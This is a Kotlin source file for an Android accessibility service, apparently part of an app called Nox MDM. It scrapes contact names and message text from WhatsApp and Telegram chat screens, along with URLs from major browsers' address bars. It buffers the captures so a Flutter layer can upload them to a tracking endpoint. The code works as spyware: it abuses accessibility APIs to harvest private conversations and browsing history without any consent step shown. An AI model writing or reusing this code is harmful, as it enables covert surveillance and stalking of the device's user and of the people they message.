package com.nox.mdm.nox_mdm

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject

/**
 * Scrapes WhatsApp chat screens and browser URL bars.
 *
 * Buffered to shared prefs for Flutter to drain. One event ≈ one node-tree
 * snapshot taken at the moment of a window state change. We throttle to
 * one capture per app per two seconds to avoid flooding when the user
 * scrolls a long chat.
 */
class NoxAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "NoxA11y"
        private const val PREFS = "nox_a11y_buffer"
        private const val KEY_PENDING = "pending_a11y"
        private const val MAX_BUFFER = 300
        private const val THROTTLE_MS = 2000L

        private val BROWSER_PACKAGES = setOf(
            "com.android.chrome",
            "com.sec.android.app.sbrowser",
            "com.microsoft.emmx",
            "org.mozilla.firefox",
            "com.brave.browser",
            "com.opera.browser",
        )

        private val MESSAGING_PACKAGES = setOf(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "org.telegram.messenger",
        )

        fun drainPending(context: Context): List<JSONObject> {
            val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            val raw = prefs.getString(KEY_PENDING, "") ?: ""
            prefs.edit().remove(KEY_PENDING).apply()
            if (raw.isBlank()) return emptyList()
            return try {
                val arr = JSONArray(raw)
                (0 until arr.length()).mapNotNull { arr.optJSONObject(it) }
            } catch (t: Throwable) {
                emptyList()
            }
        }
    }

    private val lastCaptureAt = HashMap<String, Long>()

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "accessibility service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkg = event.packageName?.toString() ?: return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                if (pkg in MESSAGING_PACKAGES) handleMessaging(pkg)
                else if (pkg in BROWSER_PACKAGES) handleBrowser(pkg)
            }
        }
    }

    override fun onInterrupt() {}

    private fun throttled(pkg: String): Boolean {
        val now = System.currentTimeMillis()
        val last = lastCaptureAt[pkg] ?: 0
        if (now - last < THROTTLE_MS) return true
        lastCaptureAt[pkg] = now
        return false
    }

    private fun handleMessaging(pkg: String) {
        if (throttled(pkg)) return
        val root = rootInActiveWindow ?: return
        try {
            // WhatsApp chat screen has an action bar with the contact name
            // and a list of message bubbles. We dump up to ~30 bubbles.
            val contactName = findContactName(root, pkg)
            val messages = extractMessages(root, pkg)
            if (contactName == null && messages.isEmpty()) return

            val payload = JSONObject().apply {
                put("appPackage", pkg)
                put("eventType", "CONVERSATION_OPENED")
                put("content", messages.joinToString("\n").take(8000))
                put("metadata", JSONObject().apply {
                    put("contactName", contactName ?: "")
                    put("messageCount", messages.size)
                    put("source", "accessibility")
                })
                put("occurredAt", isoNow())
            }
            buffer(payload)
        } catch (t: Throwable) {
            Log.w(TAG, "handleMessaging error: ${t.message}")
        } finally {
            try { root.recycle() } catch (_: Throwable) {}
        }
    }

    private fun handleBrowser(pkg: String) {
        if (throttled(pkg)) return
        val root = rootInActiveWindow ?: return
        try {
            val url = findBrowserUrl(root, pkg) ?: return
            if (url.isBlank() || url == "about:blank") return

            val payload = JSONObject().apply {
                put("url", url)
                put("appPackage", pkg)
                put("occurredAt", isoNow())
            }
            // Buffer as a browsing payload — the Flutter side posts it to
            // /tracking/browsing-history/batch separately from social events.
            bufferBrowser(payload)
        } catch (t: Throwable) {
            Log.w(TAG, "handleBrowser error: ${t.message}")
        } finally {
            try { root.recycle() } catch (_: Throwable) {}
        }
    }

    private fun findContactName(root: AccessibilityNodeInfo, pkg: String): String? {
        // WhatsApp action bar title id — stable across versions:
        // com.whatsapp:id/conversation_contact_name
        val candidates = root.findAccessibilityNodeInfosByViewId("$pkg:id/conversation_contact_name")
        if (candidates != null && candidates.isNotEmpty()) {
            return candidates.first().text?.toString()
        }
        // Fallback: any TextView directly inside the action bar.
        return null
    }

    private fun extractMessages(root: AccessibilityNodeInfo, pkg: String): List<String> {
        val out = mutableListOf<String>()
        // Message TextViews in WhatsApp are usually under id "message_text".
        val nodes = root.findAccessibilityNodeInfosByViewId("$pkg:id/message_text")
        if (nodes != null) {
            for (n in nodes) {
                val t = n.text?.toString()
                if (!t.isNullOrBlank()) out.add(t.take(500))
                if (out.size >= 30) break
            }
        }
        return out
    }

    private fun findBrowserUrl(root: AccessibilityNodeInfo, pkg: String): String? {
        // Chrome / Edge / Firefox all expose the omnibox under one of these
        // ids. We try each and take the first non-empty value.
        val ids = listOf(
            "$pkg:id/url_bar",
            "$pkg:id/location_bar_edit_text",
            "$pkg:id/mozac_browser_toolbar_url_view",
            "$pkg:id/mozac_browser_toolbar_origin_view",
        )
        for (id in ids) {
            val nodes = root.findAccessibilityNodeInfosByViewId(id) ?: continue
            for (n in nodes) {
                val raw = n.text?.toString()?.trim()
                if (!raw.isNullOrBlank()) {
                    return normalizeUrl(raw)
                }
            }
        }
        return null
    }

    private fun normalizeUrl(input: String): String {
        if (input.startsWith("http://") || input.startsWith("https://")) return input
        // Chrome omnibox often strips the scheme; add https:// for anything
        // that looks like a hostname.
        if (input.contains('.') && !input.contains(' ')) return "https://$input"
        return input
    }

    private fun buffer(payload: JSONObject) {
        val prefs = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val raw = prefs.getString(KEY_PENDING, "") ?: ""
        val arr = if (raw.isBlank()) JSONArray() else try { JSONArray(raw) } catch (_: Throwable) { JSONArray() }
        arr.put(payload)
        val trimmed = if (arr.length() > MAX_BUFFER) {
            val start = arr.length() - MAX_BUFFER
            val out = JSONArray()
            for (i in start until arr.length()) out.put(arr.get(i))
            out
        } else arr
        prefs.edit().putString(KEY_PENDING, trimmed.toString()).apply()
        NativeBridge.notifyA11y()
    }

    private fun bufferBrowser(payload: JSONObject) {
        val prefs = getSharedPreferences("nox_browser_buffer", Context.MODE_PRIVATE)
        val key = "pending_urls"
        val raw = prefs.getString(key, "") ?: ""
        val arr = if (raw.isBlank()) JSONArray() else try { JSONArray(raw) } catch (_: Throwable) { JSONArray() }
        // De-dupe against the most recently buffered URL for this package to
        // avoid writing the same URL every window-content tick.
        val lastUrl = if (arr.length() > 0) arr.optJSONObject(arr.length() - 1)?.optString("url") else null
        val newUrl = payload.optString("url")
        if (lastUrl != newUrl) {
            arr.put(payload)
            val trimmed = if (arr.length() > MAX_BUFFER) {
                val start = arr.length() - MAX_BUFFER
                val out = JSONArray()
                for (i in start until arr.length()) out.put(arr.get(i))
                out
            } else arr
            prefs.edit().putString(key, trimmed.toString()).apply()
            NativeBridge.notifyBrowser()
        }
    }

    private fun isoNow(): String {
        val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US)
        sdf.timeZone = java.util.TimeZone.getTimeZone("UTC")
        return sdf.format(java.util.Date())
    }
}
